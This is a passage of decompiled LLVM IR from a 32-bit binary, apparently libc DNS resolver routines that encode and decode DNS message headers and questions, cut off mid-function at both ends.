  %v0_805786f = phi i32 [ 0, %dec_label_pc_80577c3 ], [ %v5_8057853, %dec_label_pc_8057849 ], [ %v3_80576cc, %dec_label_pc_80576c0 ], [ 0, %dec_label_pc_805786a ]
  store i32 %v0_805786f, i32* %eax.global-to-local, align 4
  store i32 %v0_80576a8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805786f

; uselistorder directives
  uselistorder i32 %v0_805786f, { 1, 0 }
  uselistorder i32 %v0_805782e, { 1, 0 }
  uselistorder i1 %v10_8057819, { 1, 0 }
  uselistorder i32 %v0_8057819.pre, { 1, 0, 2 }
  uselistorder i32 %v1_805780f, { 1, 0, 2 }
  uselistorder i32 %v1_80577fb, { 1, 0 }
  uselistorder i32 %v0_8057804, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8057790, { 1, 0 }
  uselistorder i32 %v2_8057789, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_80577a262, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805779463, { 2, 1, 0 }
  uselistorder i32 %v0_805779e64, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_8057779, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_805781918, { 1, 0 }
  uselistorder i32 %v1_805776e, { 1, 0 }
  uselistorder i32 %v0_805776e, { 1, 0, 2 }
  uselistorder i32 %v5_8057776, { 1, 2, 0 }
  uselistorder i32 %v1_8057751, { 0, 2, 1 }
  uselistorder i32 %v0_80577419, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805774c13, { 1, 2, 0, 3 }
  uselistorder i1 %v10_805773c, { 1, 0 }
  uselistorder i32 %v0_805776766, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805775c67, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805775169, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_805770970, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_80576a8, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 14, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 97, { 5, 6, 4, 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 3, 2, 1, 0 }
  uselistorder [3 x i8]* @global_var_805b531.574, { 1, 0 }
  uselistorder i8 58, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 65535, { 0, 1, 3, 2 }
  uselistorder i32 64, { 8, 3, 10, 7, 9, 6, 2, 4, 0, 5, 1 }
  uselistorder i32* @esp, { 0, 1, 147, 7, 148, 149, 150, 151, 152, 153, 8, 262, 263, 264, 265, 266, 267, 268, 10, 269, 270, 271, 272, 273, 16, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 12, 284, 285, 286, 13, 287, 9, 288, 289, 290, 291, 292, 293, 14, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 11, 307, 308, 309, 310, 311, 312, 15, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 156, 17, 157, 2, 3, 335, 4, 5, 6, 18, 158, 159, 160, 161, 19, 162, 163, 164, 165, 22, 166, 167, 168, 23, 169, 24, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 21, 183, 25, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 20, 196, 197, 198, 199, 154, 155, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 101, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 260, 261, 334 }
  uselistorder i32 15, { 1, 5, 9, 8, 2, 7, 6, 3, 4, 0 }
  uselistorder i32 60, { 5, 6, 7, 8, 1, 9, 4, 3, 2, 0 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11, 14, 13 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 8, 9, 10, 5, 17, 16, 15, 18, 6, 1, 2, 3, 4, 7, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_805786c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805786a, { 1, 0 }
  uselistorder label %dec_label_pc_805782a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805780f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80577a6, { 1, 0 }
  uselistorder label %dec_label_pc_805779e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057784, { 1, 0 }
  uselistorder label %dec_label_pc_8057779, { 1, 0 }
  uselistorder label %dec_label_pc_8057769, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057765, { 1, 0 }
  uselistorder label %dec_label_pc_8057751, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805774e, { 1, 0 }
  uselistorder label %dec_label_pc_8057724, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805787c = load i32, i32* @ebx, align 4
  store i32 %v0_805787c, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_8057886 = ptrtoint i8* %tmp to i32
  store i32 %v4_8057886, i32* %esi.global-to-local, align 4
  %v7_805788a = icmp sgt i32 %tmp9, 11
  br i1 %v7_805788a, label %dec_label_pc_8057890, label %dec_label_pc_8057924

dec_label_pc_8057890:                             ; preds = %entry
  %v1_8057890 = add i32 %tmp8, 1
  %v2_8057890 = inttoptr i32 %v1_8057890 to i8*
  %v3_8057890 = load i8, i8* %v2_8057890, align 1
  store i8 %v3_8057890, i8* %tmp, align 1
  %v0_8057896 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057896 = inttoptr i32 %v0_8057896 to i32*
  %v2_8057896 = load i32, i32* %v1_8057896, align 4
  %v1_8057898 = trunc i32 %v2_8057896 to i8
  %v2_8057898 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057898 = add i32 %v2_8057898, 1
  %v4_8057898 = inttoptr i32 %v3_8057898 to i8*
  store i8 %v1_8057898, i8* %v4_8057898, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_80578bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578bd = add i32 %v0_80578bd, 8
  %v2_80578bd = inttoptr i32 %v1_80578bd to i32*
  %v3_80578bd = load i32, i32* %v2_80578bd, align 4
  %v1_80578c0 = mul i32 %v3_80578bd, 8
  %v2_80578c3 = and i32 %v1_80578c0, 120
  %v2_80578c6 = or i32 %v2_80578c3, 4
  store i32 %v2_80578c6, i32* %edx.global-to-local, align 4
  %v1_80578c8 = add i32 %v0_80578bd, 20
  %v2_80578c8 = inttoptr i32 %v1_80578c8 to i32*
  %v3_80578c8 = load i32, i32* %v2_80578c8, align 4
  %v4_80578c8 = icmp eq i32 %v3_80578c8, 0
  %v1_80578cc = icmp eq i1 %v4_80578c8, false
  %v2_80578cc = zext i1 %v1_80578cc to i32
  %v2_80578cf = or i32 %v2_80578cc, %v2_80578c6
  store i32 %v2_80578cf, i32* %edx.global-to-local, align 4
  %v2_80578d1 = or i32 %v2_80578cf, 130
  %v3_80578d1 = trunc i32 %v2_80578d1 to i8
  store i32 %v2_80578d1, i32* @ecx, align 4
  %v2_80578d3 = load i32, i32* %esi.global-to-local, align 4
  %v3_80578d3 = add i32 %v2_80578d3, 2
  %v4_80578d3 = inttoptr i32 %v3_80578d3 to i8*
  store i8 %v3_80578d1, i8* %v4_80578d3, align 1
  %v0_80578d6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578da = add i32 %v0_80578d6, 28
  %v2_80578da = inttoptr i32 %v1_80578da to i8*
  %v3_80578da = load i8, i8* %v2_80578da, align 1
  %v5_80578da = load i32, i32* %edx.global-to-local, align 4
  %v2_80578e3 = urem i8 %v3_80578da, 16
  %v7_80578e3 = zext i8 %v2_80578e3 to i32
  %v9_80578e3 = and i32 %v5_80578da, -256
  %v10_80578e3 = or i32 %v9_80578e3, %v7_80578e3
  store i32 %v10_80578e3, i32* %edx.global-to-local, align 4
  %v2_80578e6 = or i8 %v2_80578e3, -128
  %v2_80578e8 = load i32, i32* %esi.global-to-local, align 4
  %v3_80578e8 = add i32 %v2_80578e8, 3
  %v4_80578e8 = inttoptr i32 %v3_80578e8 to i8*
  store i8 %v2_80578e6, i8* %v4_80578e8, align 1
  %v0_80578eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578eb = add i32 %v0_80578eb, 33
  %v2_80578eb = inttoptr i32 %v1_80578eb to i8*
  %v3_80578eb = load i8, i8* %v2_80578eb, align 1
  %v2_80578ef = load i32, i32* %esi.global-to-local, align 4
  %v3_80578ef = add i32 %v2_80578ef, 4
  %v4_80578ef = inttoptr i32 %v3_80578ef to i8*
  store i8 %v3_80578eb, i8* %v4_80578ef, align 1
  %v0_80578f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578f2 = add i32 %v0_80578f2, 32
  %v2_80578f2 = inttoptr i32 %v1_80578f2 to i32*
  %v3_80578f2 = load i32, i32* %v2_80578f2, align 4
  %v1_80578f5 = trunc i32 %v3_80578f2 to i8
  %v2_80578f5 = load i32, i32* %esi.global-to-local, align 4
  %v3_80578f5 = add i32 %v2_80578f5, 5
  %v4_80578f5 = inttoptr i32 %v3_80578f5 to i8*
  store i8 %v1_80578f5, i8* %v4_80578f5, align 1
  %v0_80578f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578f8 = add i32 %v0_80578f8, 37
  %v2_80578f8 = inttoptr i32 %v1_80578f8 to i8*
  %v3_80578f8 = load i8, i8* %v2_80578f8, align 1
  %v2_80578fc = load i32, i32* %esi.global-to-local, align 4
  %v3_80578fc = add i32 %v2_80578fc, 6
  %v4_80578fc = inttoptr i32 %v3_80578fc to i8*
  store i8 %v3_80578f8, i8* %v4_80578fc, align 1
  %v0_80578ff = load i32, i32* %ebx.global-to-local, align 4
  %v1_80578ff = add i32 %v0_80578ff, 36
  %v2_80578ff = inttoptr i32 %v1_80578ff to i32*
  %v3_80578ff = load i32, i32* %v2_80578ff, align 4
  %v1_8057902 = trunc i32 %v3_80578ff to i8
  %v2_8057902 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057902 = add i32 %v2_8057902, 7
  %v4_8057902 = inttoptr i32 %v3_8057902 to i8*
  store i8 %v1_8057902, i8* %v4_8057902, align 1
  %v0_8057905 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057905 = add i32 %v0_8057905, 41
  %v2_8057905 = inttoptr i32 %v1_8057905 to i8*
  %v3_8057905 = load i8, i8* %v2_8057905, align 1
  %v2_8057909 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057909 = add i32 %v2_8057909, 8
  %v4_8057909 = inttoptr i32 %v3_8057909 to i8*
  store i8 %v3_8057905, i8* %v4_8057909, align 1
  %v0_805790c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805790c = add i32 %v0_805790c, 40
  %v2_805790c = inttoptr i32 %v1_805790c to i32*
  %v3_805790c = load i32, i32* %v2_805790c, align 4
  %v1_805790f = trunc i32 %v3_805790c to i8
  %v2_805790f = load i32, i32* %esi.global-to-local, align 4
  %v3_805790f = add i32 %v2_805790f, 9
  %v4_805790f = inttoptr i32 %v3_805790f to i8*
  store i8 %v1_805790f, i8* %v4_805790f, align 1
  %v0_8057912 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057912 = add i32 %v0_8057912, 45
  %v2_8057912 = inttoptr i32 %v1_8057912 to i8*
  %v3_8057912 = load i8, i8* %v2_8057912, align 1
  %v2_8057916 = load i32, i32* %esi.global-to-local, align 4
  %v3_8057916 = add i32 %v2_8057916, 10
  %v4_8057916 = inttoptr i32 %v3_8057916 to i8*
  store i8 %v3_8057912, i8* %v4_8057916, align 1
  %v0_8057919 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057919 = add i32 %v0_8057919, 44
  %v2_8057919 = inttoptr i32 %v1_8057919 to i32*
  %v3_8057919 = load i32, i32* %v2_8057919, align 4
  %v1_805791c = trunc i32 %v3_8057919 to i8
  %v2_805791c = load i32, i32* %esi.global-to-local, align 4
  %v3_805791c = add i32 %v2_805791c, 11
  %v4_805791c = inttoptr i32 %v3_805791c to i8*
  store i8 %v1_805791c, i8* %v4_805791c, align 1
  %v2_8057924.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8057924

dec_label_pc_8057924:                             ; preds = %entry, %dec_label_pc_8057890
  %v2_8057924 = phi i32 [ %v0_805787c, %entry ], [ %v2_8057924.pre, %dec_label_pc_8057890 ]
  %v0_8057926 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8057890 ]
  store i32 %v2_8057924, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8057926

; uselistorder directives
  uselistorder i32 45, { 5, 2, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 1, 3, 0 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 130, { 1, 2, 0 }
  uselistorder i32 120, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8057924, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8057928 = load i32, i32* @ebx, align 4
  store i32 %v0_8057928, i32* %stack_var_-4, align 4
  %v4_8057929 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8057929, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8057931 = load i8, i8* %tmp2, align 1
  %v3_8057931 = zext i8 %v2_8057931 to i32
  %v1_8057934 = add i32 %v4_8057929, 1
  %v2_8057934 = inttoptr i32 %v1_8057934 to i8*
  %v3_8057934 = load i8, i8* %v2_8057934, align 1
  %v4_8057934 = zext i8 %v3_8057934 to i32
  %v2_8057938 = mul nuw nsw i32 %v3_8057931, 256
  %v2_805793b = or i32 %v4_8057934, %v2_8057938
  %v2_805793d = inttoptr i32 %tmp to i32*
  store i32 %v2_805793b, i32* %v2_805793d, align 4
  %v0_805793f = load i32, i32* @ecx, align 4
  %v1_805793f = add i32 %v0_805793f, 2
  %v2_805793f = inttoptr i32 %v1_805793f to i8*
  %v3_805793f = load i8, i8* %v2_805793f, align 1
  %tmp6 = icmp slt i8 %v3_805793f, 0
  %v2_8057943 = zext i1 %tmp6 to i32
  %v1_8057946 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057946 = add i32 %v1_8057946, 4
  %v3_8057946 = inttoptr i32 %v2_8057946 to i32*
  store i32 %v2_8057943, i32* %v3_8057946, align 4
  %v0_8057949 = load i32, i32* @ecx, align 4
  %v1_8057949 = add i32 %v0_8057949, 2
  %v2_8057949 = inttoptr i32 %v1_8057949 to i8*
  %v3_8057949 = load i8, i8* %v2_8057949, align 1
  %v3_805794c = udiv i8 %v3_8057949, 8
  %tmp7 = urem i8 %v3_805794c, 16
  %v1_805794f = zext i8 %tmp7 to i32
  %v1_8057952 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057952 = add i32 %v1_8057952, 8
  %v3_8057952 = inttoptr i32 %v2_8057952 to i32*
  store i32 %v1_805794f, i32* %v3_8057952, align 4
  %v0_8057955 = load i32, i32* @ecx, align 4
  %v1_8057955 = add i32 %v0_8057955, 2
  %v2_8057955 = inttoptr i32 %v1_8057955 to i8*
  %v3_8057955 = load i8, i8* %v2_8057955, align 1
  %div = udiv i8 %v3_8057955, 4
  %tmp8 = urem i8 %div, 2
  %v1_805795c = zext i8 %tmp8 to i32
  %v1_805795f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805795f = add i32 %v1_805795f, 12
  %v3_805795f = inttoptr i32 %v2_805795f to i32*
  store i32 %v1_805795c, i32* %v3_805795f, align 4
  %v0_8057962 = load i32, i32* @ecx, align 4
  %v1_8057962 = add i32 %v0_8057962, 2
  %v2_8057962 = inttoptr i32 %v1_8057962 to i8*
  %v3_8057962 = load i8, i8* %v2_8057962, align 1
  %div5 = udiv i8 %v3_8057962, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8057968 = zext i8 %tmp9 to i32
  %v1_805796b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805796b = add i32 %v1_805796b, 16
  %v3_805796b = inttoptr i32 %v2_805796b to i32*
  store i32 %v1_8057968, i32* %v3_805796b, align 4
  %v0_805796e = load i32, i32* @ecx, align 4
  %v1_805796e = add i32 %v0_805796e, 2
  %v2_805796e = inttoptr i32 %v1_805796e to i8*
  %v3_805796e = load i8, i8* %v2_805796e, align 1
  %tmp10 = urem i8 %v3_805796e, 2
  %v1_8057972 = zext i8 %tmp10 to i32
  %v1_8057975 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057975 = add i32 %v1_8057975, 20
  %v3_8057975 = inttoptr i32 %v2_8057975 to i32*
  store i32 %v1_8057972, i32* %v3_8057975, align 4
  %v0_8057978 = load i32, i32* @ecx, align 4
  %v1_8057978 = add i32 %v0_8057978, 3
  %v2_8057978 = inttoptr i32 %v1_8057978 to i8*
  %v3_8057978 = load i8, i8* %v2_8057978, align 1
  %tmp11 = icmp slt i8 %v3_8057978, 0
  %v2_805797c = zext i1 %tmp11 to i32
  %v1_805797f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805797f = add i32 %v1_805797f, 24
  %v3_805797f = inttoptr i32 %v2_805797f to i32*
  store i32 %v2_805797c, i32* %v3_805797f, align 4
  %v0_8057982 = load i32, i32* @ecx, align 4
  %v1_8057982 = add i32 %v0_8057982, 3
  %v2_8057982 = inttoptr i32 %v1_8057982 to i8*
  %v3_8057982 = load i8, i8* %v2_8057982, align 1
  %tmp12 = urem i8 %v3_8057982, 16
  %v1_8057986 = zext i8 %tmp12 to i32
  %v1_8057989 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057989 = add i32 %v1_8057989, 28
  %v3_8057989 = inttoptr i32 %v2_8057989 to i32*
  store i32 %v1_8057986, i32* %v3_8057989, align 4
  %v0_805798c = load i32, i32* @ecx, align 4
  %v1_805798c = add i32 %v0_805798c, 4
  %v2_805798c = inttoptr i32 %v1_805798c to i8*
  %v3_805798c = load i8, i8* %v2_805798c, align 1
  %v4_805798c = zext i8 %v3_805798c to i32
  %v1_8057990 = add i32 %v0_805798c, 5
  %v2_8057990 = inttoptr i32 %v1_8057990 to i8*
  %v3_8057990 = load i8, i8* %v2_8057990, align 1
  %v4_8057990 = zext i8 %v3_8057990 to i32
  %v2_8057994 = mul nuw nsw i32 %v4_805798c, 256
  %v2_8057997 = or i32 %v4_8057990, %v2_8057994
  %v1_8057999 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057999 = add i32 %v1_8057999, 32
  %v3_8057999 = inttoptr i32 %v2_8057999 to i32*
  store i32 %v2_8057997, i32* %v3_8057999, align 4
  %v0_805799c = load i32, i32* @ecx, align 4
  %v1_805799c = add i32 %v0_805799c, 6
  %v2_805799c = inttoptr i32 %v1_805799c to i8*
  %v3_805799c = load i8, i8* %v2_805799c, align 1
  %v4_805799c = zext i8 %v3_805799c to i32
  %v1_80579a0 = add i32 %v0_805799c, 7
  %v2_80579a0 = inttoptr i32 %v1_80579a0 to i8*
  %v3_80579a0 = load i8, i8* %v2_80579a0, align 1
  %v4_80579a0 = zext i8 %v3_80579a0 to i32
  %v2_80579a4 = mul nuw nsw i32 %v4_805799c, 256
  %v2_80579a7 = or i32 %v4_80579a0, %v2_80579a4
  %v1_80579a9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80579a9 = add i32 %v1_80579a9, 36
  %v3_80579a9 = inttoptr i32 %v2_80579a9 to i32*
  store i32 %v2_80579a7, i32* %v3_80579a9, align 4
  %v0_80579ac = load i32, i32* @ecx, align 4
  %v1_80579ac = add i32 %v0_80579ac, 8
  %v2_80579ac = inttoptr i32 %v1_80579ac to i8*
  %v3_80579ac = load i8, i8* %v2_80579ac, align 1
  %v4_80579ac = zext i8 %v3_80579ac to i32
  %v1_80579b0 = add i32 %v0_80579ac, 9
  %v2_80579b0 = inttoptr i32 %v1_80579b0 to i8*
  %v3_80579b0 = load i8, i8* %v2_80579b0, align 1
  %v4_80579b0 = zext i8 %v3_80579b0 to i32
  %v2_80579b4 = mul nuw nsw i32 %v4_80579ac, 256
  %v2_80579b7 = or i32 %v4_80579b0, %v2_80579b4
  %v1_80579b9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80579b9 = add i32 %v1_80579b9, 40
  %v3_80579b9 = inttoptr i32 %v2_80579b9 to i32*
  store i32 %v2_80579b7, i32* %v3_80579b9, align 4
  %v0_80579bc = load i32, i32* @ecx, align 4
  %v1_80579bc = add i32 %v0_80579bc, 10
  %v2_80579bc = inttoptr i32 %v1_80579bc to i8*
  %v3_80579bc = load i8, i8* %v2_80579bc, align 1
  %v4_80579bc = zext i8 %v3_80579bc to i32
  %v1_80579c0 = add i32 %v0_80579bc, 11
  %v2_80579c0 = inttoptr i32 %v1_80579c0 to i8*
  %v3_80579c0 = load i8, i8* %v2_80579c0, align 1
  %v4_80579c0 = zext i8 %v3_80579c0 to i32
  %v2_80579c4 = mul nuw nsw i32 %v4_80579bc, 256
  %v2_80579c7 = or i32 %v4_80579c0, %v2_80579c4
  %v1_80579c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80579c9 = add i32 %v1_80579c9, 44
  %v3_80579c9 = inttoptr i32 %v2_80579c9 to i32*
  store i32 %v2_80579c7, i32* %v3_80579c9, align 4
  %v2_80579d1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80579d1, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 14, 15, 3, 4, 7, 8, 16, 5, 9, 10, 11, 12, 6, 13, 2, 1, 0 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 7, { 23, 24, 5, 10, 6, 0, 4, 11, 18, 19, 20, 21, 22, 7, 3, 1, 17, 8, 9, 12, 13, 14, 15, 16, 2 }
  uselistorder i32 6, { 24, 25, 0, 1, 11, 21, 4, 19, 12, 13, 8, 27, 14, 22, 5, 6, 3, 7, 10, 9, 15, 23, 16, 20, 17, 18, 26, 2 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 0, 43, 44, 45, 46, 47, 4, 5, 6, 2, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 3, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 1 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 16, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 17, 18, 14, 15 }
  uselistorder i8 4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 7, 8, 3 }
  uselistorder i8 8, { 0, 8, 1, 7, 2, 3, 4, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80579d4 = load i32, i32* @edi, align 4
  %v0_80579d5 = load i32, i32* @esi, align 4
  %v0_80579d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80579d6, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_80579e3 = load i32, i32* @eax, align 4
  %v1_80579e6 = inttoptr i32 %tmp to i32*
  %v2_80579e6 = load i32, i32* %v1_80579e6, align 4
  %v7_80579e8 = inttoptr i32 %v2_80579e6 to i8*
  %v8_80579e8 = call i32 @__encode_dotted(i8* %v7_80579e8, i32 %tmp2, i32 %tmp3, i32 %v0_80579e3, i32 %v0_80579d6, i32 %v0_80579d5, i32 %v0_80579d4)
  %v2_80579f0 = icmp slt i32 %v8_80579e8, 0
  store i32 %v8_80579e8, i32* @ecx, align 4
  br i1 %v2_80579f0, label %dec_label_pc_8057a21, label %dec_label_pc_80579f6

dec_label_pc_80579f6:                             ; preds = %entry
  %v0_80579f6 = load i32, i32* @ebx, align 4
  %v2_80579f6 = sub i32 %v0_80579f6, %v8_80579e8
  %v1_80579f8 = add i32 %v2_80579f6, -3
  %v6_80579f8 = sub i32 2, %v2_80579f6
  %v7_80579f8 = and i32 %v6_80579f8, %v2_80579f6
  %v8_80579f8 = icmp slt i32 %v7_80579f8, 0
  %v9_80579f8 = icmp eq i32 %v1_80579f8, 0
  %v10_80579f8 = icmp slt i32 %v1_80579f8, 0
  %v3_80579fb = icmp eq i1 %v10_80579f8, %v8_80579f8
  %v4_80579fb = icmp eq i1 %v9_80579f8, false
  %v5_80579fb = and i1 %v4_80579fb, %v3_80579fb
  br i1 %v5_80579fb, label %dec_label_pc_8057a02, label %dec_label_pc_80579fd

dec_label_pc_80579fd:                             ; preds = %dec_label_pc_80579f6
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8057a21

dec_label_pc_8057a02:                             ; preds = %dec_label_pc_80579f6
  %v0_8057a02 = load i32, i32* @edi, align 4
  %v2_8057a02 = add i32 %v0_8057a02, %v8_80579e8
  store i32 %v2_8057a02, i32* @edx, align 4
  %v0_8057a05 = load i32, i32* @esi, align 4
  %v1_8057a05 = add i32 %v0_8057a05, 5
  %v2_8057a05 = inttoptr i32 %v1_8057a05 to i8*
  %v3_8057a05 = load i8, i8* %v2_8057a05, align 1
  %v1_8057a09 = add i32 %v8_80579e8, 4
  store i32 %v1_8057a09, i32* @ecx, align 4
  %v3_8057a0c = inttoptr i32 %v2_8057a02 to i8*
  store i8 %v3_8057a05, i8* %v3_8057a0c, align 1
  %v0_8057a0e = load i32, i32* @esi, align 4
  %v1_8057a0e = add i32 %v0_8057a0e, 4
  %v2_8057a0e = inttoptr i32 %v1_8057a0e to i32*
  %v3_8057a0e = load i32, i32* %v2_8057a0e, align 4
  %v1_8057a11 = trunc i32 %v3_8057a0e to i8
  %v2_8057a11 = load i32, i32* @edx, align 4
  %v3_8057a11 = add i32 %v2_8057a11, 1
  %v4_8057a11 = inttoptr i32 %v3_8057a11 to i8*
  store i8 %v1_8057a11, i8* %v4_8057a11, align 1
  %v0_8057a14 = load i32, i32* @esi, align 4
  %v1_8057a14 = add i32 %v0_8057a14, 9
  %v2_8057a14 = inttoptr i32 %v1_8057a14 to i8*
  %v3_8057a14 = load i8, i8* %v2_8057a14, align 1
  %v2_8057a18 = load i32, i32* @edx, align 4
  %v3_8057a18 = add i32 %v2_8057a18, 2
  %v4_8057a18 = inttoptr i32 %v3_8057a18 to i8*
  store i8 %v3_8057a14, i8* %v4_8057a18, align 1
  %v0_8057a1b = load i32, i32* @esi, align 4
  %v1_8057a1b = add i32 %v0_8057a1b, 8
  %v2_8057a1b = inttoptr i32 %v1_8057a1b to i32*
  %v3_8057a1b = load i32, i32* %v2_8057a1b, align 4
  %v1_8057a1e = trunc i32 %v3_8057a1b to i8
  %v2_8057a1e = load i32, i32* @edx, align 4
  %v3_8057a1e = add i32 %v2_8057a1e, 3
  %v4_8057a1e = inttoptr i32 %v3_8057a1e to i8*
  store i8 %v1_8057a1e, i8* %v4_8057a1e, align 1
  %v0_8057a22.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057a21

dec_label_pc_8057a21:                             ; preds = %entry, %dec_label_pc_80579fd, %dec_label_pc_8057a02
